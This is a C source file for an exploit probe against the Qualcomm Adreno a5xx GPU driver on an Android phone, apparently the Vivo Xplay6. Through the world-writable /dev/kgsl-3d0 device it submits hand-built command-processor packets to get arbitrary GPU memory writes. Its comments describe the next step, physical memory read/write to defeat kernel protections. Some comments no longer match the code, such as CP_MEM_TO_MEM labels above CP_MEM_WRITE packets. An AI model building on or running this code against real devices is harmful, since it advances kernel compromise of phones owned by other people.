#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include "msm_kgsl.h"

/* Adreno a5xx command-execution probe for Xplay6 (/dev/kgsl-3d0 is 0666).
 *
 * Why this is the route worth the turns: no KASLR, SELinux enforcing shell, and
 * every *user-visible* kernel copy destination on this 3.18 build is
 * access_ok-checked (ledger S74).  The GPU CP is the one remaining engine that
 * writes memory without going through copy_to_user at all -- and this driver has
 * no IB packet whitelist (no IsPacketAuthorized / adreno_config anywhere in
 * drivers/gpu/msm), so a context I am allowed to create can carry arbitrary CP
 * packets.  If MEM_TO_MEM lands, the next rung is a CP-written physical R/W.
 *
 * Staged so each failure is attributable:
 *   P1 alloc 3 GPUMEM bufs with flags=0 (driver assigns a GPU VA we can point at)
 *   P2 mmap each with offset = id << PAGE_SHIFT   (the convention that bit me once)
 *   P3 submit an IB containing only CP_NOP            -> does submission work at all
 *   P4 submit CP_MEM_TO_MEM src->dst, read dst back   -> does the CP really execute
 *
 * phys mapping for the later step: memstart = 0x80000000 (DTB memory@80000000),
 * PAGE_OFFSET = 0xffffffc000000000  =>  phys = va - PAGE_OFFSET + 0x80000000
 */

#define OFF(id)   ((off_t)(id) << 12)

/* a5xx TYPE4 header -- copied from THIS driver's cp_type4_packet()
 * (drivers/gpu/msm/adreno_pm4types.h:259-266), because pkt_is_type4() re-checks
 * BOTH parity bits and the CP rejects the packet as "opcode error" otherwise:
 *   (4<<28) | cnt<<0 | oddparity(cnt)<<7 | (opcode&0x3FFFF)<<8 | oddparity(opcode)<<27
 * cnt = payload dwords, EXCLUDING the header. */
/* EXACT copy of pm4_calc_odd_parity_bit() from THIS tree's adreno_pm4types.h:236.
 * It is the 0x9669 EVEN-parity fold (returns 1 when popcount is EVEN) -- the
 * inverse of a popcount%2 XOR fold.  Getting this wrong makes EVERY packet fault. */
static unsigned int pm4_parity(unsigned int val)
{
    return (0x9669 >> (0xF & (val ^ (val >> 4) ^ (val >> 8) ^ (val >> 12) ^
                              (val >> 16) ^ (val >> 20) ^ (val >> 24) ^ (val >> 28)))) & 1;
}

static uint32_t cp7(uint32_t opcode, uint32_t cnt)
{
    return (7u << 28) | (cnt & 0x7FFFu) | (pm4_parity(cnt) << 15) |
           (((opcode) & 0x7Fu) << 16) | (pm4_parity(opcode) << 23);
}

static uint32_t cp4(uint32_t opcode, uint32_t cnt)
{
    return (4u << 28) | (cnt & 0x3Fu) | (pm4_parity(cnt) << 7) |
           (((opcode) & 0x3FFFFu) << 8) | (pm4_parity(opcode) << 27);
}

/* TYPE3 is a3xx/a4xx only; a5xx IB1 wants TYPE4, so CP_NOP goes through cp4(). */
#define T3(op, cnt)   cp7((op), (cnt))
#define T4(op, cnt)   cp7((op), (cnt))

/* a5xx PM4 opcode-space packets are TYPE7 (the driver itself emits
 * cp_type7_packet(CP_...) in adreno_a5xx.c); TYPE4 on this generation is a CP
 * *register write*, which is why correct-parity TYPE4 headers still faulted as
 * "ringbuffer opcode error".  And CP_MEM_TO_MEM does not exist in this header at
 * all -- the write primitive here is CP_MEM_WRITE (payload: count,value,addr64). */
#define CP_NOP            0x10
#define CP_MEM_WRITE      0x3d
#define CP_EVENT_WRITE    0x46

static int fd;
static unsigned long ib_gpu, src_gpu, dst_gpu;
static unsigned int ib_id, src_id, dst_id;
static uint32_t *ib_cpu, *src_cpu, *dst_cpu;

static int alloc_fixed(unsigned *id, unsigned long *gpu, uint32_t **cpu, const char *tag)
{
    struct kgsl_gpumem_alloc_id a;
    void *p;

    memset(&a, 0, sizeof a);
    a.flags = 0;              /* let the driver pick a GPU VA */
    a.size = 0x1000;
    if (ioctl(fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &a)) {
        printf("  %-10s alloc FAILED errno=%d (%s)\n", tag, errno, strerror(errno));
        return -1;
    }
    p = mmap(NULL, a.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, OFF(a.id));
    if (p == MAP_FAILED) {
        printf("  %-10s alloc id=%u gpuaddr=%#lx OK but mmap FAILED errno=%d (%s)\n",
               tag, a.id, (unsigned long)a.gpuaddr, errno, strerror(errno));
        return -1;
    }
    *id = a.id; *gpu = (unsigned long)a.gpuaddr; *cpu = (uint32_t *)p;
    printf("  %-10s id=%u gpuaddr=%#lx mmapsize=%#zx cpu=%p\n", tag, a.id,
           (unsigned long)a.gpuaddr, (size_t)a.mmapsize, p);
    return 0;
}

static int submit(unsigned int ctx, unsigned long gpu, unsigned int dwords, unsigned int ts,
                  const char *tag)
{
    struct kgsl_command_object objs[1];
    struct kgsl_gpu_command cmd;
    int rc;

    memset(objs, 0, sizeof objs);
    objs[0].offset = 0;
    objs[0].gpuaddr = gpu;
    objs[0].size = dwords * 4;
    objs[0].flags = KGSL_CMDLIST_IB;
    objs[0].id = 0;

    memset(&cmd, 0, sizeof cmd);
    cmd.flags = 0;
    cmd.cmdlist = (uint64_t)(uintptr_t)objs;
    cmd.cmdsize = sizeof objs[0];
    cmd.numcmds = 1;
    cmd.objlist = 0;
    cmd.objsize = 0;
    cmd.numobjs = 0;
    cmd.context_id = ctx;
    cmd.timestamp = 0;            /* let the driver assign; read it back */

    errno = 0;
    rc = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &cmd);
    printf("  %-10s GPU_COMMAND rc=%d errno=%d (%s) ts_back=%u\n", tag, rc, errno,
           rc ? strerror(errno) : "ok", cmd.timestamp);
    return rc;
}

int main(int argc, char **argv)
{
    struct kgsl_drawctxt_create dctx;
    unsigned int ts = 1;
    int stage = argc > 1 ? atoi(argv[1]) : 4;

    setvbuf(stdout, NULL, _IONBF, 0);

    fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { printf("open kgsl: %s\n", strerror(errno)); return 1; }

    /* Allocations first, drawctxt after -- mirroring the proven kgsl_gate order. */
    if (alloc_fixed(&ib_id, &ib_gpu, &ib_cpu, "IB") ||
        alloc_fixed(&src_id, &src_gpu, &src_cpu, "SRC") ||
        alloc_fixed(&dst_id, &dst_gpu, &dst_cpu, "DST"))
        return 1;

    memset(&dctx, 0, sizeof dctx);
    /* flags = 0 is rejected with EINVAL on this driver; kgsl_gate's working value: */
    dctx.flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC;
    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &dctx)) {
        printf("drawctxt FAILED errno=%d (%s)\n", errno, strerror(errno));
        return 1;
    }
    printf("drawctxt_id=%u flags=%#x\n", dctx.drawctxt_id, dctx.flags);

    /* P3: CP_NOP only */
    int i;
    if (stage >= 3) {
        for (i = 0; i < 64; i++) ib_cpu[i] = cp7(CP_NOP, 0);
        printf("P3 IB[0..1] = %08x %08x at gpuaddr %#lx\n", ib_cpu[0], ib_cpu[1], ib_gpu);
        if (submit(dctx.drawctxt_id, ib_gpu, 2, ts++, "P3 nop") == 0) {
            usleep(300000);
            printf("P3 submitted clean -- CP submission path works\n");
        } else {
            printf("P3 FAILED -> IB submission is not reachable from this context\n");
            if (stage >= 4) return 1;
        }
    }

    /* P4: CP_MEM_TO_MEM src -> dst, 16 dwords */
    if (stage >= 4) {
        int i;
        for (i = 0; i < 64; i++) src_cpu[i] = 0x11220000u + i;
        for (i = 0; i < 64; i++) dst_cpu[i] = 0xAAAAAAAAu;

        memset(ib_cpu, 0, 0x100);
        /* TYPE4 CP_MEM_TO_MEM: hdr, dst_lo, dst_hi, src_lo, src_hi, num_dwords */
        ib_cpu[0] = cp7(CP_MEM_WRITE, 4);
        ib_cpu[1] = 64;                       /* count: dwords to write */
        ib_cpu[2] = 0xDEADBEEFu;              /* value */
        ib_cpu[3] = (uint32_t)(dst_gpu & 0xffffffff);
        ib_cpu[4] = (uint32_t)(dst_gpu >> 32);
        printf("   CP_MEM_WRITE hdr=%08x  (cnt=4 par=%u, op=0x3d par=%u)\n",
               ib_cpu[0], pm4_parity(4), pm4_parity(CP_MEM_WRITE));
        printf("P4 IB = %08x %08x %08x %08x %08x %08x | dst=%#lx src=%#lx\n",
               ib_cpu[0], ib_cpu[1], ib_cpu[2], ib_cpu[3], ib_cpu[4], ib_cpu[5],
               dst_gpu, src_gpu);

        if (submit(dctx.drawctxt_id, ib_gpu, 5, ts++, "P4 mem_write") == 0) {
            usleep(500000);
            {
                int hits = 0, aa = 0;
                for (i = 0; i < 64; i++) {
                    if (dst_cpu[i] == 0xAAAAAAAAu) aa++;
                    if (dst_cpu[i] == 0xDEADBEEFu) hits++;
                }
                printf("P4 dst: %d/64 == 0xDEADBEEF (CP wrote it), %d/64 still 0xAAAAAAAA\n",
                       hits, aa);
                if (hits)
                    printf("*** CP WRITES MEMORY: GPU command execution achieved ***\n");
                else
                    printf("P4 no copy landed -- check packet encoding / ring wakeup\n");
            }
        }
    }
    return 0;
}
